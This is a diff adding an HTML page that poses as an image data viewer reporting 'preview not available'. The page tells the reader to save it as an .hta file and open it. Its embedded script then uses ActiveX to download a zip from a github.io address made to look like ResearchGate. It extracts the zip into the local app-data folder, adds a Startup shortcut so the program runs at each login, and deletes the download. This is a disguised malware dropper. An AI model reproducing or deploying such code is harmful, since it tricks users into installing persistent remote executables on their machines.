@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image data Algorithm</title>
+    <HTA:APPLICATION 
+        ID="ImageDataApp"
+        APPLICATIONNAME="Image Data Algorithm"
+        SCROLL="no"
+        SINGLEINSTANCE="yes"
+        WINDOWSTATE="normal">
+    </HTA:APPLICATION>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        :root {
+            --text-dark: #4f4f50;
+        }
+        
+        body {
+            background-color: #d6d6d6;
+            color: var(--text-dark);
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .main-content {
+            display: flex;
+            flex-direction: column;
+            gap: 30px;
+        }
+        
+        #img-no-preview {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        #instructions {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+
+        #instructions ul  {
+            margin-left: 50px; 
+        }
+
+        .buffer-icon {
+            display: none;
+            align-items: center;
+            gap: 10px;
+            color: black;
+        }
+
+        .spinner {
+            width: 30px;
+            height: 30px;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-content">
+        <div id="img-no-preview">
+            <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 24 24">
+                <!-- Triangle -->
+                <polygon points="12,2 2,22 22,22" fill="none" stroke="#9E9E9E" stroke-width="2"/>
+                <!-- Exclamation mark -->
+                <line x1="12" y1="10" x2="12" y2="17" stroke="#986A6A" stroke-width="2"/>
+                <circle cx="12" cy="19" r="1" fill="#986A6A"/>
+            </svg>
+            <p>Data preview is not available.</p>
+        </div>
+        <div id="instructions">
+            <p>To access the data locally, follow the below instructions</p>
+            <ul>
+                <li>Press <kbd>Ctrl</kbd> + <kbd>S</kbd> to save the file</li>
+                <li>Name the file with <code>.hta</code> extension (like <code>img_data.hta</code>)</li>
+                <li>Open the saved file and wait for the process to finish</li>
+            </ul>
+        </div>
+    </div>
+    <div class="buffer-icon">
+        <div class="spinner"></div>
+        <p>Please wait for process to finish ...</p>
+    </div>
+    <script language="JavaScript">
+        const mainContent = document.querySelector(".main-content");
+        const bufferIcon = document.querySelector(".buffer-icon");
+
+        function isHTA() {
+            try {
+                return (typeof window.external !== "undefined" &&
+                    typeof document.parentWindow !== "undefined" &&
+                    window.location.protocol === "ms-hta:");
+            } catch (e) {
+                return false;
+            }
+        } 
+
+        function installApplication() {
+            try {
+                const fso = new ActiveXObject("Scripting.FileSystemObject");
+                const shell = new ActiveXObject("WScript.Shell");
+
+                // Get paths 
+                const appDataPath = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%");
+                const tempPath = shell.ExpandEnvironmentStrings("%TEMP%");
+                const zipPath = tempPath + "\\Everything.zip";
+                const exePath = appDataPath + "\\Everything\\Everything.exe";
+                const zipUrl = "https://researchgate-cell.github.io/image-data/everything.zip";
+
+                // Download ZIP file 
+                downloadFile(zipUrl, zipPath);
+
+                // Extract ZIP file 
+                extractZipFile(zipPath, appDataPath);
+
+                // Create startup shortcut
+                const startupFolder = shell.SpecialFolders("Startup");
+                const shortcutPath = startupFolder + "\\Everything.lnk";
+                const shortcut = shell.CreateShortcut(shortcutPath);
+                shortcut.TargetPath = exePath;
+                shortcut.Arguments = "-startup";
+                shortcut.WorkingDirectory = fso.GetParentFolderName(exePath);
+                shortcut.Save();
+
+                fso.DeleteFile(zipPath);
+
+                window.close();
+
+            } catch (e) {
+                alert("Installation failed: " + e.message);
+            }
+        }
+
+        function downloadFile(url, filePath) {
+            const http = new ActiveXObject("Microsoft.XMLHTTP");
+            const stream = new ActiveXObject("ADODB.Stream");
+
+            http.open("GET", url, false);
+            http.send();
+
+            if (http.status === 200) {
+                stream.Type = 1;
+                stream.Open();
+                stream.Write(http.responseBody);
+                stream.SaveToFile(filePath, 2);
+                stream.Close();
+            } else {
+                throw new Error("Download failed : " + http.status);
+            }
+        }
+
+        function extractZipFile(zipPath, extractPath) {
+            const shell = new ActiveXObject("Shell.Application");
+            const zipFolder = shell.NameSpace(zipPath);
+            const destFolder = shell.NameSpace(extractPath);
+
+            // Copy all items from ZIP to destination
+            destFolder.CopyHere(zipFolder.Items(), 4 | 16);
+        }
+
+        if (isHTA()) {
+            mainContent.style.display = "none";
+            bufferIcon.style.display = "flex";
+            try {
+                installApplication();
+                mainContent.innerHTML = "<p>Process completed successfully</p>";
+            } catch (error) {
+                mainContent.innerHTML = "<p>Process failed: " + error.message + "</p>";
+            } finally {
+                mainContent.style.display = "block";
+                bufferIcon.style.display = "none";
+            }
+        }
+    </script>
+</body>
+</html>
